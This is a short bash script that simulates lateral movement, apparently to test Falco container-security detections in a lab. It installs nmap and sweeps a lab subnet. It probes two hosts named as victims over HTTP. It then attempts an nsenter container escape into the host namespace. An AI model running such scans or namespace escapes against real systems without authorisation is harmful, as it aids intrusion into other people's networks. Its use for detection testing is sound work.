#!/bin/bash

echo "[LATERAL] Lateral Movement Simulation"

echo "[LATERAL] Installing nmap for network reconnaissance..."
apt-get install -y nmap -qq 2>/dev/null || true

echo "[LATERAL] Scanning lateral-net subnet (172.20.3.0/24)..."
nmap -sn 172.20.3.0/24 2>/dev/null | grep "Nmap scan report" | while read -r line; do
    echo "[LATERAL][!] Host found: $line"
done

echo "[LATERAL] Probing victim-lat-a HTTP service..."
curl -s --max-time 3 http://victim-lat-a/ 2>/dev/null \
    && echo "[LATERAL][!] Connected to victim-lat-a HTTP" \
    || echo "[LATERAL][-] victim-lat-a unreachable"

echo "[LATERAL] Probing victim-lat-b HTTP service..."
curl -s --max-time 3 http://victim-lat-b/ 2>/dev/null \
    && echo "[LATERAL][!] Connected to victim-lat-b HTTP" \
    || echo "[LATERAL][-] victim-lat-b unreachable"

echo "[LATERAL] Attempting nsenter into PID 1 namespace (triggers Falco rule)..."
nsenter --target 1 --mount --uts --ipc --net -- hostname 2>/dev/null \
    && echo "[LATERAL][!] nsenter SUCCESS — in host namespace" \
    || echo "[LATERAL][-] nsenter blocked (seccomp/cap restriction)"

echo "[LATERAL] Attack simulation complete"
